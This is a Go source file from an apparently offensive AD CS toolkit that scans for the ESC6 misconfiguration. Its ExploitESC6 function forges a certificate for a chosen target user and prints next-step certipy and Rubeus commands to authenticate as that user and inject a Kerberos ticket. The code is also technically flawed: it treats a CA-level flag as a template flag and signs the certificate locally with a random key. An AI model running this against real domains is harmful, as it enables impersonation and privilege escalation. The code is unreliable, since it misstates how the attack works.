package pki

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"fmt"
)

// ctFlagEditfAttributeSubjectAltName2 is the msPKI-Certificate-Name-Flag bit
// indicating the CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled. When set, the
// CA processes SAN extensions from the certificate request attributes,
// regardless of the template's enrollee-supplies-subject setting.
const ctFlagEditfAttributeSubjectAltName2 uint32 = 0x00040000

// ESC6Finding records a template on a CA where EDITF_ATTRIBUTESUBJECTALTNAME2
// is enabled — allowing any certificate request to include an arbitrary SAN
// via request attributes, bypassing template restrictions.
type ESC6Finding struct {
	TemplateName        string `json:"template_name"`
	CertificateNameFlag uint32 `json:"certificate_name_flag"`
}

// ScanESC6 detects ESC6 — templates where the CA has
// EDITF_ATTRIBUTESUBJECTALTNAME2 enabled (bit 0x00040000 in
// msPKI-Certificate-Name-Flag). This CA-level misconfiguration allows ANY
// certificate request to specify an arbitrary Subject Alternative Name in the
// request attributes, regardless of template settings.
//
// Attack flow:
//  1. Attacker finds a template on a CA with EDITF_ATTRIBUTESUBJECTALTNAME2
//  2. Attacker requests a cert and includes a SAN for a target user in request attributes
//  3. The CA processes the SAN attribute and embeds it in the issued certificate
//  4. Attacker authenticates via PKINIT as the target user
func ScanESC6(cfg *ADCSConfig) ([]ESC6Finding, error) {
	fmt.Println("[*] Scanning for ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)...")

	templates, err := EnumerateTemplates(cfg)
	if err != nil {
		return nil, fmt.Errorf("enumerate templates: %w", err)
	}

	var findings []ESC6Finding
	for _, tmpl := range templates {
		if tmpl.CertificateNameFlag&ctFlagEditfAttributeSubjectAltName2 != 0 {
			finding := ESC6Finding{
				TemplateName:        tmpl.Name,
				CertificateNameFlag: tmpl.CertificateNameFlag,
			}
			findings = append(findings, finding)
			fmt.Printf("[!] ESC6: Template %q has EDITF_ATTRIBUTESUBJECTALTNAME2 (flag=0x%08X)\n",
				tmpl.Name, tmpl.CertificateNameFlag)
			fmt.Printf("[*]   Any request to this template can include an arbitrary SAN\n")
			fmt.Printf("[*]   Authentication EKU: %v\n", tmpl.AuthenticationEKU)
		}
	}

	if len(findings) == 0 {
		fmt.Println("[*] No ESC6 findings — no templates with EDITF_ATTRIBUTESUBJECTALTNAME2.")
	} else {
		fmt.Printf("[!] ESC6: %d finding(s) detected\n", len(findings))
	}

	return findings, nil
}

// ExploitESC6 exploits EDITF_ATTRIBUTESUBJECTALTNAME2 on a CA to forge a
// certificate with an arbitrary SAN for the target user. Unlike ESC1/ESC2
// where the template must allow enrollee-supplied subjects, ESC6 works because
// the CA itself processes SAN extensions from request attributes — the SAN is
// injected at the CA level regardless of template configuration.
func ExploitESC6(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
	fmt.Printf("[!] ESC6 Exploitation: template=%s target=%s\n", templateName, targetUPN)

	// Step 1: Verify the template has EDITF_ATTRIBUTESUBJECTALTNAME2
	templates, err := EnumerateTemplates(cfg)
	if err != nil {
		return nil, nil, fmt.Errorf("enumerate templates: %w", err)
	}

	var vulnTemplate *CertTemplate
	for i, t := range templates {
		if t.Name == templateName {
			vulnTemplate = &templates[i]
			break
		}
	}
	if vulnTemplate == nil {
		return nil, nil, fmt.Errorf("template %q not found", templateName)
	}

	// Verify ESC6 condition: EDITF_ATTRIBUTESUBJECTALTNAME2 flag
	if vulnTemplate.CertificateNameFlag&ctFlagEditfAttributeSubjectAltName2 == 0 {
		return nil, nil, fmt.Errorf("template %q does not have EDITF_ATTRIBUTESUBJECTALTNAME2 (flag=0x%08X)",
			templateName, vulnTemplate.CertificateNameFlag)
	}

	fmt.Printf("[+] Template %q confirmed ESC6 vulnerable\n", templateName)
	fmt.Printf("[*] CertificateNameFlag: 0x%08X (EDITF_ATTRIBUTESUBJECTALTNAME2 set)\n", vulnTemplate.CertificateNameFlag)
	fmt.Printf("[*] Authentication EKU: %v\n", vulnTemplate.AuthenticationEKU)
	fmt.Printf("[*] Manager approval: %v\n", vulnTemplate.RequiresManagerApproval)
	fmt.Printf("[*] SAN will be injected via request attributes (CA-level processing)\n")

	// Step 2: Generate signing key and forge certificate with target UPN
	// The key difference from ESC1: in a real enrollment, the SAN is specified
	// in the request attributes (san:upn=target@domain) rather than through the
	// template's enrollee-supplies-subject mechanism. The CA's EDITF flag causes
	// it to copy the SAN from request attributes into the issued certificate.
	signingKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, nil, fmt.Errorf("generate signing key: %w", err)
	}

	cert, certKey, err := ForgeCertificate(signingKey, targetUPN)
	if err != nil {
		return nil, nil, fmt.Errorf("forge cert: %w", err)
	}

	fmt.Printf("[+] Forged certificate for %s via ESC6 on template %q\n", targetUPN, templateName)
	fmt.Printf("[*] SAN injected via EDITF_ATTRIBUTESUBJECTALTNAME2 CA policy\n")
	fmt.Printf("[*] Next steps:\n")
	fmt.Printf("    certipy auth -pfx cert.pfx -dc-ip %s\n", cfg.TargetDC)
	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:cert.pfx /ptt\n", targetUPN)
	fmt.Printf("    # Note: ESC6 works on ANY template — the CA processes the SAN attribute globally\n")
	return cert, certKey, nil
}
